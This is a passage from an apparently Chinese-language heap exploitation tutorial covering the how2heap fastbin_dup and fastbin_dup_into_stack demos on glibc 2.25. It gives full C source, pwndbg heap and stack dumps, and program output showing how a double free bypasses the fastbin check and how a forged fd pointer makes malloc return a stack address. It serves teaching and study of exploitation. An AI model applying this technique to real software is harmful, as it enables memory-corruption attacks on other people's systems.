    0x602000 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x602020 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x21
    }
    0x602040 FASTBIN {
      prev_size = 0x0,
      size = 0x21,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x20fa1
    }
    0x602060 PREV_INUSE {
      prev_size = 0x0,
      size = 0x20fa1,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后 free(a)
    15   fprintf(stderr, "3rd malloc(8): %p\n", c);
       16
       17   fprintf(stderr, "Freeing the first one...\n");
     ► 18   free(a);
       19
       20   fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
       21   //free(a);
free(b)
    22
       23   fprintf(stderr, "So, instead, we'll free %p.\n", b);
       24   free(b);
       25
     ► 26   fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
       27   free(a);
这个时候，fastbin 形成一个 fastbin freelist
    Pwndbg> fastbins
    fastbins
    0x20: 0x602020 —▸ 0x602000 ◂— 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
chunk A ---> chunk B
然后我们再把 a free 一次
    22
       23   fprintf(stderr, "So, instead, we'll free %p.\n", b);
       24   free(b);
       25
       26   fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
     ► 27   free(a);
       28
       29   fprintf(stderr, "Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
       30   fprintf(stderr, "1st malloc(8): %p\n", malloc(8));
       31   fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
       32   fprintf(stderr, "3rd malloc(8): %p\n", malloc(8));
我们发现这次并没有发生报错。形成了如下的 free list。
    Pwndbg> fastbins
    fastbins
    0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
————— ————— —————
|Chunk A| -> |chunk B| -->| chunk A|
————— ————— —————
​ /\ |
​ | ------------- -------
大概如上个图，这样我们就成功绕过了 fastbins 的double free检查。原因如下：
fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin->fd 来遍历 fastbins。由于 free 的过程会对 free
list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free
过程，从而绕过检查顺利执行。然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。
### 0x3 fastbin_dup_into_stack
    #include 
    #include 
    int main()
    {
        fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
               "returning a pointer to a controlled location (in this case, the stack).\n");
        unsigned long long stack_var;
        fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);
        fprintf(stderr, "Allocating 3 buffers.\n");
        int *a = malloc(8);
        int *b = malloc(8);
        int *c = malloc(8);
        fprintf(stderr, "1st malloc(8): %p\n", a);
        fprintf(stderr, "2nd malloc(8): %p\n", b);
        fprintf(stderr, "3rd malloc(8): %p\n", c);
        fprintf(stderr, "Freeing the first one...\n");
        free(a);
        fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
        // free(a);
        fprintf(stderr, "So, instead, we'll free %p.\n", b);
        free(b);
        fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
        free(a);
        fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
            "We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
        unsigned long long *d = malloc(8);
        fprintf(stderr, "1st malloc(8): %p\n", d);
        fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
        fprintf(stderr, "Now the free list has [ %p ].\n", a);
        fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
            "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
            "so that malloc will think there is a free chunk there and agree to\n"
            "return a pointer to it.\n", a);
        stack_var = 0x20;
        fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
        *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
        fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
        fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
    }
通用的，编译后我们 gdb 挂载程序。
程序通用 malloc 了三个 chunk,紧接着通过 fastbin double free 的操作形成了如下freelist。
    Pwndbg> fastbins
    fastbins
    0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
然后呢 我再malloc chunk d
    36   unsigned long long *d = malloc(8);
       37
       38   fprintf(stderr, "1st malloc(8): %p\n", d);
       39   fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
       40   fprintf(stderr, "Now the free list has [ %p ].\n", a);
     ► 41   fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
       42       "so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
       43       "so that malloc will think there is a free chunk there and agree to\n"
       44       "return a pointer to it.\n", a);
       45   stack_var = 0x20;
这个时候 程序会从 fastbins 里取一个，由于fastbins 是 LIFO （Last in First out）。 chunk A
会被取出使用。倘若我们这个时候能对 chunk D 进行操作，如 `d = (unsigned long long)
(((char*)&stack_var) - sizeof(d));` 由于 `stack_var =
0x20;`这样的定义是在函数内，所以`stack_var`的地址将在栈上，通过对指针 **d** 的操作，我们可以伪造一个 chunk ，并将这个
chunk 放在栈上。
    Pwndbg> x/20a 0x603000
    0x603000:   0x0 0x21
    0x603010:   0x7fffffffe388  0x0
    0x603020:   0x0 0x21
    0x603030:   0x603000    0x0
    0x603040:   0x0 0x21
    0x603050:   0x0 0x0
    0x603060:   0x0 0x20fa1
    0x603070:   0x0 0x0
    0x603080:   0x0 0x0
    0x603090:   0x0 0x0
    Pwndbg> x/20a 0x7fffffffe388
    0x7fffffffe388: 0x40097c  0x20
    0x7fffffffe398: 0x603010    0x603030
    0x7fffffffe3a8: 0x603050    0x603010
    0x7fffffffe3b8: 0xc3e158ae04ceee00  0x4009a0 
    0x7fffffffe3c8: 0x7ffff7a303f1   0x40000
    0x7fffffffe3d8: 0x7fffffffe4a8  0x1f7b9a488
    0x7fffffffe3e8: 0x400686  0x0
    0x7fffffffe3f8: 0x4ffa6e8ae3316c56  0x400590 
    0x7fffffffe408: 0x7fffffffe4a0  0x0
    0x7fffffffe418: 0x0 0xb00591f537d16c56
    Pwndbg> stack 10
    00:0000│ rsp  0x7fffffffe390 ◂— 0x20 /* ' ' */
    01:0008│      0x7fffffffe398 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8
    02:0010│      0x7fffffffe3a0 —▸ 0x603030 —▸ 0x603000 ◂— 0x0
    03:0018│      0x7fffffffe3a8 —▸ 0x603050 ◂— 0x0
    04:0020│      0x7fffffffe3b0 —▸ 0x603010 —▸ 0x7fffffffe388 —▸ 0x40097c (main+758) ◂— 0x4d8b4800000000b8
    05:0028│      0x7fffffffe3b8 ◂— 0xc3e158ae04ceee00
    06:0030│ rbp  0x7fffffffe3c0 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741
    07:0038│      0x7fffffffe3c8 —▸ 0x7ffff7a303f1 (__libc_start_main+241) ◂— mov    edi, eax
    08:0040│      0x7fffffffe3d0 ◂— 0x40000
    09:0048│      0x7fffffffe3d8 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6ea ◂— 0x77732f656d6f682f ('/home/sw')
`stack_var = 0x20;` 是由于伪造的 chunk 要由 设置size，size的位置位于 地址-0x8的地方。
    ➜  glibc_2.25 git:(master) ✗ ./fastbin_dup_into_stack
    This file extends on fastbin_dup.c by tricking malloc into
    returning a pointer to a controlled location (in this case, the stack).
    The address we want malloc() to return is 0x7fff02a085c8.
    Allocating 3 buffers.
    1st malloc(8): 0x146b010
    2nd malloc(8): 0x146b030
    3rd malloc(8): 0x146b050
    Freeing the first one...
    If we free 0x146b010 again, things will crash because 0x146b010 is at the top of the free list.
    So, instead, we'll free 0x146b030.
    Now, we can free 0x146b010 again, since it's not the head of the free list.
    Now the free list has [ 0x146b010, 0x146b030, 0x146b010 ]. We'll now carry out our attack by modifying data at 0x146b010.
    1st malloc(8): 0x146b010
    2nd malloc(8): 0x146b030
    Now the free list has [ 0x146b010 ].
    Now, we have access to 0x146b010 while it remains at the head of the free list.
    so now we are writing a fake free size (in this case, 0x20) to the stack,
    so that malloc will think there is a free chunk there and agree to
    return a pointer to it.
    Now, we overwrite the first 8 bytes of the data at 0x146b010 to point right before the 0x20.
    3rd malloc(8): 0x146b010, putting the stack address on the free list
    4th malloc(8): 0x7fff02a085c8
最后效果如上，我们发现当 chunk a 被拿出来后,由于我们伪造了chunk a 的 fd，造成如下效果。
    Pwndbg> fastbins
    fastbins